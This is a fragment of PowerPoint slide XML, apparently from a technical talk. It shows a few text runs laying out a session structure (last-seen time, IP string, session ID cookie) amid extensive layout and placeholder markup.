          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1400"/>
              <a:t>0x04</a:t>
            </a:r>
            <a:endParaRPr sz="1400"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="188038"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>time()</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="188038"/>
              </a:solidFill>
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Last seen time (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="188038"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>local_74</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1400"/>
              <a:t>0x08</a:t>
            </a:r>
            <a:endParaRPr sz="1400"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1400"/>
              <a:t>IP string</a:t>
            </a:r>
            <a:endParaRPr sz="1400"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="188038"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>::ffff:192.168.100.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> (32B)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1400"/>
              <a:t>0x28</a:t>
            </a:r>
            <a:endParaRPr sz="1400"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1400"/>
              <a:t>session ID</a:t>
            </a:r>
            <a:endParaRPr sz="1400"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Cookie string like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="188038"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>332073917</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> (32B)</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2">
            <a:alphaModFix amt="50000"/>
          </a:blip>
          <a:srcRect b="8145" l="3133" r="7834" t="16785"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm flipH="1" rot="10800000">
            <a:off x="0" y="-3474"/>
            <a:ext cx="9161550" cy="5154499"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Google Shape;52;p13"/>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3" name="Google Shape;53;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="1738950"/>
            <a:ext cx="4402800" cy="252000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr lvl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="18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4" name="Google Shape;54;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320625" y="4675975"/>
            <a:ext cx="27000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 name="Google Shape;55;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4716740" y="4675975"/>
            <a:ext cx="22947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6" name="Google Shape;56;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6859200" y="4683725"/>
            <a:ext cx="2056500" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:norm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7" name="Google Shape;57;p1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8" name="Google Shape;58;p1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9" name="Google Shape;59;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="228600"/>
            <a:ext cx="6658800" cy="1419000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:norm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60" name="Google Shape;60;p1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61" name="Google Shape;61;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="297075" y="4175900"/>
            <a:ext cx="1264800" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:norm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2" name="Google Shape;62;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="6" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1786375" y="4175900"/>
            <a:ext cx="1264800" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:norm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63" name="Google Shape;63;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="7" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228591" y="3454475"/>
            <a:ext cx="4659600" cy="252000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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64" name="Google Shape;64;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="8" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228591" y="3743050"/>
            <a:ext cx="4659600" cy="252000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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65" name="Shape 6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66" name="Shape 66"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="Google Shape;67;p15"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="2" type="pic"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4618950" y="228600"/>
            <a:ext cx="1370400" cy="1357500"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 16935" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Google Shape;68;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4619000" y="1702322"/>
            <a:ext cx="1370400" cy="171900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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120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69" name="Google Shape;69;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320625" y="4675975"/>
            <a:ext cx="27000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0" name="Google Shape;70;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4716740" y="4675975"/>
            <a:ext cx="22947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1" name="Google Shape;71;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6859200" y="4683725"/>
            <a:ext cx="2056500" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:norm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2" name="Google Shape;72;p15"/>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73" name="Google Shape;73;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="6" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4619000" y="1880160"/>
            <a:ext cx="1370400" cy="171900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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120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74" name="Google Shape;74;p15"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="7" type="pic"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6080700" y="228600"/>
            <a:ext cx="1370400" cy="1357500"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 16935" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="Google Shape;75;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="8" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6080750" y="1702321"/>
            <a:ext cx="1370400" cy="171900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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120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76" name="Google Shape;76;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="9" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6080750" y="1880160"/>
            <a:ext cx="1370400" cy="171900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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120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77" name="Google Shape;77;p15"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="13" type="pic"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7542450" y="228600"/>
            <a:ext cx="1370400" cy="1357500"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 16935" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="Google Shape;78;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="14" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7542500" y="1702321"/>
            <a:ext cx="1370400" cy="171900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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120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79" name="Google Shape;79;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="15" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7542500" y="1880160"/>
            <a:ext cx="1370400" cy="171900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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120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80" name="Google Shape;80;p15"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="16" type="pic"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4618950" y="2295725"/>
            <a:ext cx="1370400" cy="1357500"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 16935" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Google Shape;81;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="17" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4619000" y="3769446"/>
            <a:ext cx="1370400" cy="171900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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120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82" name="Google Shape;82;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="18" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4619000" y="3947285"/>
            <a:ext cx="1370400" cy="171900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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120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83" name="Google Shape;83;p15"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="19" type="pic"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6080700" y="2295725"/>
            <a:ext cx="1370400" cy="1357500"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 16935" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="Google Shape;84;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="20" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6080750" y="3769447"/>
            <a:ext cx="1370400" cy="171900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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120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85" name="Google Shape;85;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="21" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6080750" y="3947285"/>
            <a:ext cx="1370400" cy="171900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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120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86" name="Google Shape;86;p15"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="22" type="pic"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7542450" y="2295725"/>
            <a:ext cx="1370400" cy="1357500"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 16935" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="Google Shape;87;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="23" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7542500" y="3769446"/>
            <a:ext cx="1370400" cy="171900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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120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88" name="Google Shape;88;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="24" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7542500" y="3947285"/>
            <a:ext cx="1370400" cy="171900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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120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89" name="Google Shape;89;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90" name="Google Shape;90;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1" name="Google Shape;91;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92" name="Shape 92"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr descr="Oval black shapes against a shadowy background. " id="93" name="Google Shape;93;p16"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="42245" l="17240" r="25038" t="34"/>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94" name="Google Shape;94;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4314775" y="3818375"/>
            <a:ext cx="4230600" cy="452700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr lvl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="18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95" name="Google Shape;95;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320625" y="4675975"/>
            <a:ext cx="27000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6" name="Google Shape;96;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4716740" y="4675975"/>
            <a:ext cx="22947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7" name="Google Shape;97;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6859200" y="4683725"/>
            <a:ext cx="2056500" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:norm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8" name="Google Shape;98;p16"/>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99" name="Google Shape;99;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100" name="Google Shape;100;p16"/>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101" name="Google Shape;101;p16"/>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102" name="Google Shape;102;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3" name="Google Shape;103;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104" name="Shape 104"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Google Shape;105;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="228600"/>
            <a:ext cx="2920800" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:norm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06" name="Google Shape;106;p17"/>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107" name="Google Shape;107;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320625" y="4675975"/>
            <a:ext cx="27000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8" name="Google Shape;108;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4716740" y="4675975"/>
            <a:ext cx="22947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9" name="Google Shape;109;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6859200" y="4683725"/>
            <a:ext cx="2056500" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:norm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10" name="Google Shape;110;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11" name="Google Shape;111;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112" name="Google Shape;112;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13" name="Google Shape;113;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="254625" y="1638300"/>
            <a:ext cx="1128900" cy="1188300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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114" name="Google Shape;114;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="6" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3275850" y="1638300"/>
            <a:ext cx="1128900" cy="1188300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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115" name="Google Shape;115;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="7" type="subTitle"/>
